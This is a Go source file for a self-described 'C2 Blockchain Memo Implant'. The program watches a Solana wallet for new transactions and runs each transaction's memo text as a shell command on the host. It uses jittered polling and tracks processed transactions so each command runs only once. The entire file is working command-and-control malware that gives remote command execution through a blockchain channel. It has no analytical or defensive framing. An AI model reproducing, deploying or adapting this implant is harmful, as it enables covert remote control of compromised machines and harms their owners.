// cmd/client/main.go — C2 Blockchain Memo Implant
//
// Watches a Solana wallet address for incoming transactions and
// extracts any memo text (via the Memo Program). If the memo
// contains a shell command, it executes the command locally.
//
// The implant tracks which transactions it has already processed
// so it only executes each command once.
//
// Usage:
//
//	# Watch a wallet (no keypair needed — read-only mode):
//	go run ./cmd/client --address <WALLET_ADDRESS> --rpc devnet
//
//	# Watch own wallet from keypair:
//	go run ./cmd/client --keypair implant-keypair.json --rpc devnet
//
//	# Watch with custom polling interval (default 15s, with ±50% jitter):
//	go run ./cmd/client --address ... --interval 30

package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gagliardetto/solana-go"
	"github.com/gagliardetto/solana-go/rpc"
)

// seenTracks keeps track of processed transaction signatures so we
// never re-execute a command.
type seenTracker struct {
	mu   sync.Mutex
	seen map[string]struct{}
}

func (st *seenTracker) Add(sig string) {
	st.mu.Lock()
	st.seen[sig] = struct{}{}
	st.mu.Unlock()
}

func (st *seenTracker) Has(sig string) bool {
	st.mu.Lock()
	defer st.mu.Unlock()
	_, ok := st.seen[sig]
	return ok
}

func main() {
	var (
		addressStr  = flag.String("address", "", "Implant wallet address to watch")
		keypairPath = flag.String("keypair", "", "Path to implant keypair (uses its address)")
		rpcEndpoint = flag.String("rpc", rpc.DevNet_RPC, "RPC endpoint: mainnet-beta, devnet, testnet, or custom URL")
		intervalSec = flag.Int("interval", 15, "Polling interval in seconds")
		limit       = flag.Int("limit", 10, "Max transactions to fetch per poll")
	)
	flag.Parse()

	endpoint := resolveEndpoint(*rpcEndpoint)

	// ── Resolve the wallet address to watch ──────────────────────────
	var watchAddress solana.PublicKey

	if *addressStr != "" {
		var err error
		watchAddress, err = solana.PublicKeyFromBase58(*addressStr)
		if err != nil {
			log.Fatalf("Invalid --address %q: %v", *addressStr, err)
		}
	} else if *keypairPath != "" {
		key, err := loadKeypair(*keypairPath)
		if err != nil {
			log.Fatalf("Failed to load keypair from %q: %v", *keypairPath, err)
		}
		watchAddress = key.PublicKey()
	} else {
		log.Fatal("Either --address or --keypair must be provided")
	}

	fmt.Printf("🔭 Watching address: %s\n", watchAddress.String())
	fmt.Printf("🔗 RPC endpoint:     %s\n", endpoint)
	fmt.Printf("⏱  Poll interval:    %ds (with ±50%% jitter)\n", *intervalSec)
	fmt.Println()

	client := rpc.New(endpoint)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	tracker := &seenTracker{seen: make(map[string]struct{})}
	baseInterval := time.Duration(*intervalSec) * time.Second

	// ── Signal handling for graceful shutdown ───────────────────────
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	fmt.Println("━━━ C2 Blockchain Memo — Implant ─━━")
	fmt.Println("Listening for commands... Press Ctrl+C to stop.")
	fmt.Println()

	// ── Polling loop ─────────────────────────────────────────────────
	poll := func() {
		sigs, err := client.GetSignaturesForAddressWithOpts(
			ctx,
			watchAddress,
			&rpc.GetSignaturesForAddressOpts{
				Limit:      &[]int{*limit}[0],
				Commitment: rpc.CommitmentConfirmed,
			},
		)
		if err != nil {
			log.Printf("⚠️  Poll error: %v", err)
			return
		}

		// Process newest first (they come newest-first from the RPC)
		for _, ts := range sigs {
			// Only process confirmed/finalized transactions
			if ts.Err != nil {
				continue
			}
			// Skip already-seen
			sigStr := ts.Signature.String()
			if tracker.Has(sigStr) {
				continue
			}
			tracker.Add(sigStr)

			// Check for memo via TxMemo field (populated by runtime for
			// transactions that include a Memo Program instruction).
			// This is faster than fetching the full transaction.
			if ts.Memo == nil || *ts.Memo == "" {
				// No memo attached to this transaction — skip.
				// Optionally, we could fall back to fetching the full
				// transaction and parsing instructions, but the Memo
				// field is reliable for Memo Program transactions.
				continue
			}

			command := *ts.Memo
			fmt.Printf("📩 New command from tx %s:\n", sigStr)
			fmt.Printf("   Command: %s\n", command)
			executeCommand(command)
			fmt.Println()
		}
	}

	// Do an initial poll immediately
	poll()

	// ── Polling ticker with jitter ───────────────────────────────────
	ticker := time.NewTicker(baseInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Add jitter: ±50% of base interval, then poll
			jitter := time.Duration(float64(baseInterval) * (rand.Float64() - 0.5))
			time.Sleep(baseInterval + jitter)

			poll()

			// Schedule next tick
			ticker.Reset(baseInterval)

		case <-sigCh:
			fmt.Println("\n👋 Shutting down...")
			cancel()
			return
		}
	}
}

// ── Command execution ───────────────────────────────────────────────

func executeCommand(command string) {
	// Determine shell
	shell, ok := os.LookupEnv("SHELL")
	if !ok {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell, "-c", command)
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	// Capture stdout
	output, err := cmd.Output()

	if err != nil {
		log.Printf("❌ Command failed: %v", err)
		if len(output) > 0 {
			fmt.Printf("   Output (partial): %s\n", strings.TrimSpace(string(output)))
		}
		return
	}

	outStr := strings.TrimSpace(string(output))
	if outStr != "" {
		fmt.Printf("✅ Output:\n%s\n", outStr)
	} else {
		fmt.Println("✅ Command executed (no output)")
	}
}

// ── Keypair loading (shared helper) ─────────────────────────────────

func loadKeypair(path string) (solana.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read file: %w", err)
	}

	content := strings.TrimSpace(string(data))

	// Base58-encoded private key string
	if !strings.HasPrefix(content, "[") {
		pk, err := solana.PrivateKeyFromBase58(content)
		if err != nil {
			return nil, fmt.Errorf("invalid base58 private key: %w", err)
		}
		return pk, nil
	}

	// Solana CLI format: JSON integer array [12, 34, 56, ...]
	var byteArr []byte
	if err := json.Unmarshal([]byte(content), &byteArr); err != nil {
		return nil, fmt.Errorf("JSON decode of keypair: %w", err)
	}
	if len(byteArr) != 64 {
		return nil, fmt.Errorf("expected 64 keypair bytes, got %d", len(byteArr))
	}

	return solana.PrivateKey(byteArr), nil
}

// ── Endpoint resolution ─────────────────────────────────────────────

func resolveEndpoint(name string) string {
	switch strings.ToLower(name) {
	case "mainnet", "mainnet-beta", "main":
		return rpc.MainNetBeta_RPC
	case "devnet", "dev":
		return rpc.DevNet_RPC
	case "testnet", "test":
		return rpc.TestNet_RPC
	default:
		return name
	}
}

func init() {
	rand.New(rand.NewSource(time.Now().UnixNano()))
}
